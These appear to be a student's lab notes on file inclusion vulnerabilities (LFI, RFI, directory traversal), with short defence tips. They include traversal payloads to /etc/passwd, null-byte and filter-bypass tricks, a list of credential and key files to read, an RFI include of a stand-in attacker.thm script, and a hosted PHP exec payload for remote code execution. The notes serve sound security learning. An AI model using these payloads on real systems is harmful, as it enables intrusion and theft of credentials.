File Inclusion:
    * File inclusion vulnerabilities include LFI (Local FI), RFI (Remote FI) & Directory Traversal
    * In some cases, web apps are written to request a certain file from a system. Done via parameters
    * Take this example URL:
        http://webapp.thm/get.php?file=CV.pdf
        [prot] [Domain]   [file] ^ [param]
    
    * Get requests pass user input into search engine. e.g https://www.google.com/search?q=TryHackMe

    Requesting files from webserver:
        * User sends HTTP request that includes a file to display.
        * Server fulfils get request (userCV.pdf retrieved).

Why do file inclusion vulnerabilities exist?
    * Poorly written PHP/other web app PLs.
    * INPUT VALIDATION! If input is not properly sanitized & validated user can pass any param to fxn.
    * File inclusion + write ability can be used to gain remote command execution.
    - RCE - allows hacker to run arbitrary code on a remote system.

    Path/Directory Traversal: (dot dot slash attack)
    [
        * A vulnerability allowing an attacker to read OS resources such as local files.
        * Exploited by abusing the web apps URL to locate and access files, directories outside of the applications root directory.
        * Occurs when users input is passed to a fxn such as ****file_get_contents (PHP). 
            - https://www.php.net/manual/en/function.file-get-contents.php
        * Poor input validation, sanitization & filtering allow this.
        * Dot dot slash attack leverages ../ to change directory up one step.
        Example: ttp://webapp.thm/get.php?file=../../../../etc/passwd
        On windows: http://webapp.thm/get.php?file=../../../../boot.ini or http://webapp.thm/get.php?file=../../../../windows/win.ini
        * Here are some common examples of [place] [Description]

            /etc/issue      contains a message or system identification to be printed before the login prompt.

            /etc/profile    controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived

            /proc/version   specifies the version of the Linux kernel
            
            etc/passwd      has all registered users that have access to a system
        
            /etc/shadow     contains information about the system's users' passwords

            /root/.bash_history     contains the history commands for root user

            /var/log/dmessage       contains global system messages, including the messages that are logged during system startup

            /var/mail/root          all emails for root user

            /root/.ssh/id_rsa       Private SSH keys for a root or any known valid user on the server

            /var/log/apache2/access.log     the accessed requests for Apache web server

            C:\boot.ini                     contains the boot options for computers with BIOS firmware
    ]


    LIF: (Local File Inclusion)
    [
        * LFI attacks occur due to a developer's lack of security awareness.
        * Doesn't just occur in PHP, also ASP, JSP, or even in Node.js apps.
        * For example, PHP makes a GET request for language:
            http://webapp.thm/index.php?lang=EN.php
            - Theoretically we can access any readable file if there is no input sanitization/validation.
        * In black box scenarios, errors are very helpful in understanding how data is passed and processed to web app.

        * Let's say we're trying to find passwd.txt but error returns 'couldnt find passwd.php'
        * This means the developer specifies the file type.
        * To bypass this, use null bytes! '%00'
        * This is an injection method that terminates a string. A trick to disregard the extension.
        * Note: the %00 trick is fixed and not working with PHP 5.3.4 and above
        * EDIT URL to something like: http://10.10.205.145/lab3.php?file=http%3A%2F%2Fwebapp.thm%2Findex.php%3Flang%3D..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500

        Bypassing Filters:
            * Say the developer filters keywords to avoid disclosing sensitive info, (etc/passwd)
            * Two methods: NULL BYTE (%00) & Current directory (./) can be inserted at the end.
            * Use errors to compare input with validated input (maybe it removes ../!).
            * Solution: Check how robust validation is. e.g (../../../../   --->    ....//....//....//....//....//etc/passwd)
            * In some cases the above will only remove the ../ in the first pass, then leaves the substr.

        Example: Include is forced to read from a defined directory
            * Simple. Just include the folder in input. 
                => http://10.10.205.145/lab6.php?file=THM-profile/../../../../etc/os-release%00
    ]

    Remote File Inclusion: (RFI)
    [
        * Method to include remote files into a vulnerable application. Attacker injects an external URL into include.
        * Relies on the same poor input sanitization/ validation.
        * Also relies on allow_url_fopen option being on.
        * RFI is high risk: Remote Code Execution (RCE), Sensitive Information Disclosure, Cross-site Scripting (XSS), Denial of Service (DoS)
        * Attacker hosts malicious scripts on a server. This server communicates with the application server.
        * Then, malicious file is injected into the include fxn via HTTP requests. Malicious code ran on app server.

        Example:
            - Attacker hosts http://attacker.thm/cmd.txt on their server.
            - Malicious URL is injected: ttp://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
            - If there is no input validation, gets passed to include fxn.
            - Web server sends GET request for file from malicious server, executes file within page.
            - Sends the execution content to attacker.
    ]

    Steps for testing for LFI

        Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
        Enter a valid input to see how the web server behaves.
        Enter invalid inputs, including special characters and common file names.
        Don't always trust what you supply in input forms is what you intended! Use Burpsuite.
        Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
        Understand the input validation and if there are any filters!
        Try the inject a valid entry to read sensitive files

    Protecting against LFI:
        Keep systems & services & web application frameworks up to date.
        Turn off PHP errors to avoid leaking paths.
        Web Application Firewall (WAP)
        Disable risky PHP features like allow_url_fopen and allow_url_include
        Only allow necessary protocols/ PHP wrappers.
        Never trust user input

    Example: LFI Challenge
    1.  Use inspector, find input field, change GET to post.
    2.  Turn on burpsuite to capture requests. FIGURE THIS OUT!!!
    3.  post works now.
    4.  Could be in cookies: go to storage, cookie and look at fields. (Changed user to admin)
    
    Final Task: RCE
        * First we must create a .txt file that contains PHP code: <?php echo exec("hostname"); ?>
        * Host the file directly using: python3 -m http.server 9000
        * Then, go back to input field. insert URL: http://IP.where.file.hosted:port(9000)/test.txt
        